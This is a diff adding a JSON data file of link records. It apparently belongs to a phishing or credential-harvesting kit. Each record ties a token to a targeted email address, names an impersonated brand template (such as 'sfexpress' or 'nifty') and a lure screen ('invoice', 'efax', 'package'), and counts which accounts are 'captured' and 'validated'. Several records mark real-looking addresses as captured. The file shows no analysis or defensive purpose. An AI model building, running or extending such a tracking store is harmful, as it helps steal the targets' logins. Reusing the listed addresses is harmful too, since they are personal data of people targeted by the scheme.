@@ -1,0 +1,425 @@
+{
+  "1763109578369_w2zxyar584r3": {
+    "id": "link_1763109578369_w2zxyar584r3",
+    "type": "generic",
+    "sessionIdentifier": "1763109578369_w2zxyar584r3",
+    "linkToken": "1763109578369_w2zxyar584r3",
+    "name": "GenericLink_1emails",
+    "email": null,
+    "allowedEmails": [
+      "papilio-platycnemis@nifty.com"
+    ],
+    "validatedAccounts": [],
+    "capturedEmails": [],
+    "pendingEmails": [
+      "papilio-platycnemis@nifty.com"
+    ],
+    "totalEmails": 1,
+    "capturedCount": 0,
+    "pendingCount": 1,
+    "createdAt": 1763109578369,
+    "expiresAt": 1765701578369,
+    "used": false,
+    "usedAt": null,
+    "fingerprint": null,
+    "ip": null,
+    "status": "active",
+    "templateId": "nifty",
+    "templateMode": "manual",
+    "loadingScreen": "efax",
+    "loadingDuration": 3
+  },
+  "1763112201552_x6z2lgzfdm28": {
+    "id": "link_1763112201552_x6z2lgzfdm28",
+    "type": "generic",
+    "sessionIdentifier": "1763112201552_x6z2lgzfdm28",
+    "linkToken": "1763112201552_x6z2lgzfdm28",
+    "name": "GenericLink_1emails",
+    "email": null,
+    "allowedEmails": [
+      "paster@game.com"
+    ],
+    "validatedAccounts": [
+      "paster@game.com"
+    ],
+    "capturedEmails": [
+      "paster@game.com"
+    ],
+    "pendingEmails": [],
+    "totalEmails": 1,
+    "capturedCount": 1,
+    "pendingCount": 0,
+    "createdAt": 1763112201552,
+    "expiresAt": 1765704201552,
+    "used": false,
+    "usedAt": null,
+    "fingerprint": null,
+    "ip": null,
+    "status": "active",
+    "templateMode": "auto",
+    "loadingScreen": "meeting",
+    "loadingDuration": 3
+  },
+  "1763113810644_mvg4b59vnpbi": {
+    "id": "link_1763113810644_mvg4b59vnpbi",
+    "type": "generic",
+    "sessionIdentifier": "1763113810644_mvg4b59vnpbi",
+    "linkToken": "1763113810644_mvg4b59vnpbi",
+    "name": "GenericLink_1emails",
+    "email": null,
+    "allowedEmails": [
+      "adam@jwrinc.com"
+    ],
+    "validatedAccounts": [],
+    "capturedEmails": [],
+    "pendingEmails": [
+      "adam@jwrinc.com"
+    ],
+    "totalEmails": 1,
+    "capturedCount": 0,
+    "pendingCount": 1,
+    "createdAt": 1763113810644,
+    "expiresAt": 1765705810644,
+    "used": false,
+    "usedAt": null,
+    "fingerprint": null,
+    "ip": null,
+    "status": "active",
+    "templateId": "sfexpress",
+    "templateMode": "manual",
+    "loadingScreen": "voice",
+    "loadingDuration": 3
+  },
+  "1763113851895_2yzx0ohqcokg": {
+    "id": "link_1763113851895_2yzx0ohqcokg",
+    "type": "generic",
+    "sessionIdentifier": "1763113851895_2yzx0ohqcokg",
+    "linkToken": "1763113851895_2yzx0ohqcokg",
+    "name": "GenericLink_1emails",
+    "email": null,
+    "allowedEmails": [
+      "adam@jwrinc.com"
+    ],
+    "validatedAccounts": [],
+    "capturedEmails": [],
+    "pendingEmails": [
+      "adam@jwrinc.com"
+    ],
+    "totalEmails": 1,
+    "capturedCount": 0,
+    "pendingCount": 1,
+    "createdAt": 1763113851895,
+    "expiresAt": 1765705851895,
+    "used": false,
+    "usedAt": null,
+    "fingerprint": null,
+    "ip": null,
+    "status": "active",
+    "templateId": "sfexpress",
+    "templateMode": "manual",
+    "loadingScreen": "efax",
+    "loadingDuration": 3
+  },
+  "1763113852952_jal59wo9t6qu": {
+    "id": "link_1763113852952_jal59wo9t6qu",
+    "type": "generic",
+    "sessionIdentifier": "1763113852952_jal59wo9t6qu",
+    "linkToken": "1763113852952_jal59wo9t6qu",
+    "name": "GenericLink_1emails",
+    "email": null,
+    "allowedEmails": [
+      "adam@jwrinc.com"
+    ],
+    "validatedAccounts": [],
+    "capturedEmails": [],
+    "pendingEmails": [
+      "adam@jwrinc.com"
+    ],
+    "totalEmails": 1,
+    "capturedCount": 0,
+    "pendingCount": 1,
+    "createdAt": 1763113852952,
+    "expiresAt": 1765705852952,
+    "used": false,
+    "usedAt": null,
+    "fingerprint": null,
+    "ip": null,
+    "status": "active",
+    "templateId": "sfexpress",
+    "templateMode": "manual",
+    "loadingScreen": "efax",
+    "loadingDuration": 3
+  },
+  "1763113875787_9rsaholikyim": {
+    "id": "link_1763113875787_9rsaholikyim",
+    "type": "generic",
+    "sessionIdentifier": "1763113875787_9rsaholikyim",
+    "linkToken": "1763113875787_9rsaholikyim",
+    "name": "GenericLink_1emails",
+    "email": null,
+    "allowedEmails": [
+      "adam@jwrinc.com"
+    ],
+    "validatedAccounts": [],
+    "capturedEmails": [],
+    "pendingEmails": [
+      "adam@jwrinc.com"
+    ],
+    "totalEmails": 1,
+    "capturedCount": 0,
+    "pendingCount": 1,
+    "createdAt": 1763113875787,
+    "expiresAt": 1765705875787,
+    "used": false,
+    "usedAt": null,
+    "fingerprint": null,
+    "ip": null,
+    "status": "active",
+    "templateId": "sfexpress",
+    "templateMode": "manual",
+    "loadingScreen": "companyNotice",
+    "loadingDuration": 3
+  },
+  "1763113900022_ok0rhl3d296p": {
+    "id": "link_1763113900022_ok0rhl3d296p",
+    "type": "generic",
+    "sessionIdentifier": "1763113900022_ok0rhl3d296p",
+    "linkToken": "1763113900022_ok0rhl3d296p",
+    "name": "GenericLink_1emails",
+    "email": null,
+    "allowedEmails": [
+      "adam@jwrinc.com"
+    ],
+    "validatedAccounts": [],
+    "capturedEmails": [],
+    "pendingEmails": [
+      "adam@jwrinc.com"
+    ],
+    "totalEmails": 1,
+    "capturedCount": 0,
+    "pendingCount": 1,
+    "createdAt": 1763113900022,
+    "expiresAt": 1765705900022,
+    "used": false,
+    "usedAt": null,
+    "fingerprint": null,
+    "ip": null,
+    "status": "active",
+    "templateId": "sfexpress",
+    "templateMode": "manual",
+    "loadingScreen": "invoice",
+    "loadingDuration": 3
+  },
+  "1763113914557_cb5si8avipti": {
+    "id": "link_1763113914557_cb5si8avipti",
+    "type": "generic",
+    "sessionIdentifier": "1763113914557_cb5si8avipti",
+    "linkToken": "1763113914557_cb5si8avipti",
+    "name": "GenericLink_1emails",
+    "email": null,
+    "allowedEmails": [
+      "adam@jwrinc.com"
+    ],
+    "validatedAccounts": [],
+    "capturedEmails": [],
+    "pendingEmails": [
+      "adam@jwrinc.com"
+    ],
+    "totalEmails": 1,
+    "capturedCount": 0,
+    "pendingCount": 1,
+    "createdAt": 1763113914557,
+    "expiresAt": 1765705914557,
+    "used": false,
+    "usedAt": null,
+    "fingerprint": null,
+    "ip": null,
+    "status": "active",
+    "templateId": "sfexpress",
+    "templateMode": "manual",
+    "loadingScreen": "invoice",
+    "loadingDuration": 3
+  },
+  "1763113935548_pesmvab1lwvq": {
+    "id": "link_1763113935548_pesmvab1lwvq",
+    "type": "generic",
+    "sessionIdentifier": "1763113935548_pesmvab1lwvq",
+    "linkToken": "1763113935548_pesmvab1lwvq",
+    "name": "GenericLink_1emails",
+    "email": null,
+    "allowedEmails": [
+      "adam@jwrinc.com"
+    ],
+    "validatedAccounts": [],
+    "capturedEmails": [],
+    "pendingEmails": [
+      "adam@jwrinc.com"
+    ],
+    "totalEmails": 1,
+    "capturedCount": 0,
+    "pendingCount": 1,
+    "createdAt": 1763113935548,
+    "expiresAt": 1765705935548,
+    "used": false,
+    "usedAt": null,
+    "fingerprint": null,
+    "ip": null,
+    "status": "active",
+    "templateId": "sfexpress",
+    "templateMode": "manual",
+    "loadingScreen": "invoice",
+    "loadingDuration": 3
+  },
+  "1763113951467_6jvfjqjv0dqi": {
+    "id": "link_1763113951467_6jvfjqjv0dqi",
+    "type": "generic",
+    "sessionIdentifier": "1763113951467_6jvfjqjv0dqi",
+    "linkToken": "1763113951467_6jvfjqjv0dqi",
+    "name": "GenericLink_1emails",
+    "email": null,
+    "allowedEmails": [
+      "adaem@jwrinc.com"
+    ],
+    "validatedAccounts": [],
+    "capturedEmails": [],
+    "pendingEmails": [
+      "adaem@jwrinc.com"
+    ],
+    "totalEmails": 1,
+    "capturedCount": 0,
+    "pendingCount": 1,
+    "createdAt": 1763113951467,
+    "expiresAt": 1765705951467,
+    "used": false,
+    "usedAt": null,
+    "fingerprint": null,
+    "ip": null,
+    "status": "active",
+    "templateId": "sfexpress",
+    "templateMode": "manual",
+    "loadingScreen": "invoice",
+    "loadingDuration": 3
+  },
+  "1763114001347_gm7panwn2ekc": {
+    "id": "link_1763114001347_gm7panwn2ekc",
+    "type": "generic",
+    "sessionIdentifier": "1763114001347_gm7panwn2ekc",
+    "linkToken": "1763114001347_gm7panwn2ekc",
+    "name": "GenericLink_1emails",
+    "email": null,
+    "allowedEmails": [
+      "adaem@jwrinc.com"
+    ],
+    "validatedAccounts": [],
+    "capturedEmails": [],
+    "pendingEmails": [
+      "adaem@jwrinc.com"
+    ],
+    "totalEmails": 1,
+    "capturedCount": 0,
+    "pendingCount": 1,
+    "createdAt": 1763114001347,
+    "expiresAt": 1765706001347,
+    "used": false,
+    "usedAt": null,
+    "fingerprint": null,
+    "ip": null,
+    "status": "active",
+    "templateId": "sfexpress",
+    "templateMode": "manual",
+    "loadingScreen": "cloudStorage",
+    "loadingDuration": 3
+  },
+  "1763114023668_ravyscm5kx6u": {
+    "id": "link_1763114023668_ravyscm5kx6u",
+    "type": "generic",
+    "sessionIdentifier": "1763114023668_ravyscm5kx6u",
+    "linkToken": "1763114023668_ravyscm5kx6u",
+    "name": "GenericLink_1emails",
+    "email": null,
+    "allowedEmails": [
+      "adaem@jwrinc.com"
+    ],
+    "validatedAccounts": [],
+    "capturedEmails": [],
+    "pendingEmails": [
+      "adaem@jwrinc.com"
+    ],
+    "totalEmails": 1,
+    "capturedCount": 0,
+    "pendingCount": 1,
+    "createdAt": 1763114023669,
+    "expiresAt": 1765706023668,
+    "used": false,
+    "usedAt": null,
+    "fingerprint": null,
+    "ip": null,
+    "status": "active",
+    "templateId": "sfexpress",
+    "templateMode": "manual",
+    "loadingScreen": "package",
+    "loadingDuration": 3
+  },
+  "1763114071637_jehykb1qygsf": {
+    "id": "link_1763114071637_jehykb1qygsf",
+    "type": "generic",
+    "sessionIdentifier": "1763114071637_jehykb1qygsf",
+    "linkToken": "1763114071637_jehykb1qygsf",
+    "name": "GenericLink_1emails",
+    "email": null,
+    "allowedEmails": [
+      "adarem@jwrinc.com"
+    ],
+    "validatedAccounts": [
+      "adarem@jwrinc.com"
+    ],
+    "capturedEmails": [
+      "adarem@jwrinc.com"
+    ],
+    "pendingEmails": [],
+    "totalEmails": 1,
+    "capturedCount": 1,
+    "pendingCount": 0,
+    "createdAt": 1763114071637,
+    "expiresAt": 1765706071637,
+    "used": false,
+    "usedAt": null,
+    "fingerprint": null,
+    "ip": null,
+    "status": "active",
+    "templateId": "sfexpress",
+    "templateMode": "manual",
+    "loadingScreen": "package",
+    "loadingDuration": 3
+  },
+  "1763114487533_izezkxul51n6": {
+    "id": "link_1763114487533_izezkxul51n6",
+    "type": "generic",
+    "sessionIdentifier": "1763114487533_izezkxul51n6",
+    "linkToken": "1763114487533_izezkxul51n6",
+    "name": "GenericLink_1emails",
+    "email": null,
+    "allowedEmails": [
+      "johsoe@facebook.com"
+    ],
+    "validatedAccounts": [],
+    "capturedEmails": [],
+    "pendingEmails": [
+      "johsoe@facebook.com"
+    ],
+    "totalEmails": 1,
+    "capturedCount": 0,
+    "pendingCount": 1,
+    "createdAt": 1763114487533,
+    "expiresAt": 1765706487533,
+    "used": false,
+    "usedAt": null,
+    "fingerprint": null,
+    "ip": null,
+    "status": "active",
+    "templateId": "nifty",
+    "templateMode": "manual",
+    "loadingScreen": "package",
+    "loadingDuration": 3
+  }
+}
